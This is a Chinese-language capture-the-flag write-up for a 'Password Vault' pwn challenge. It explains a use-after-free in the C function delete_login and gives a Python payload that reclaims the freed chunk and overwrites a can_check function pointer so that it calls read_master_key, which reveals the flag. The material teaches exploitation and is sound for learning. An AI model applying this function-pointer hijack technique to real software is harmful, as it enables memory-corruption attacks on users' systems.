# Password Vault Writeup

## 題目描述
```text
High level password manager. No way you can get my master key
```

[vault](https://dalctf2026.com/files/3a5b1b45828f85f1b981c01d2a29ff60/vault?token=eyJ1c2VyX2lkIjozMjcsInRlYW1faWQiOjE4MywiZmlsZV9pZCI6NzI0fQ.aiaygg.mNIXLV3d8C0dhu7N4p_gE65Us4A)
[manager.c](https://dalctf2026.com/files/c5f68215c03cd2adef2133dceaad943d/manager.c?token=eyJ1c2VyX2lkIjozMjcsInRlYW1faWQiOjE4MywiZmlsZV9pZCI6NzI1fQ.aiaygg.4teTDd9D1lXtElcASQGhFqHqNEM)

## 解題思路

1. **第一步**：

    首先先觀察程式的漏洞：

    ```c
    static void delete_login(void)
    {
        int i = read_int("  slot [0-7]: ");
        if(!check_slot_empty(i)) return;
        printf("  [-] deleting login for '%s'\n", logins[i]->username);
        free(logins[i]);
    }
    ```

    在delete_login裡面，這個函式只釋放記憶體，沒有清除指標，所以有機會可以在delete_login之後把can_check改成read_master_key()，就可以沿用指標拿flag。

2. **第二步**：

    先找到read_master_key的函式位址，用pwn或objdump都行，然後用p64(read_master_key)蓋掉can_check：

    ```python
    def payload() -> bytes:
        login_size = 32
        fake_login = p64(read_master_key) + b"A" * (login_size - 8)

        return b"".join([
            b"1\n",        # new login
            b"0\n",        # slot 0
            b"user\n",     # username
            b"pass\n",     # password
            b"2\n",        # delete login; leaves dangling pointer in logins[0]
            b"0\n",        # slot 0
            b"3\n",        # set password; malloc(32) reuses freed Login chunk
            b"32\n",       # same allocation size as sizeof(Login)
            fake_login,    # overwrite can_check function pointer
            b"\n4\n",      # check master key
            b"0\n",        # slot 0
            b"0\n",        # quit
        ])
    ```

    用修改後的login跑read_master_key，就可以得到flag。
    
    上面的詳細指令有請AI整理過，對照著看即可。
    
## Flag

```text
dalctf{fr33d_fr0m_d4s1r3_n4n4n4}
```
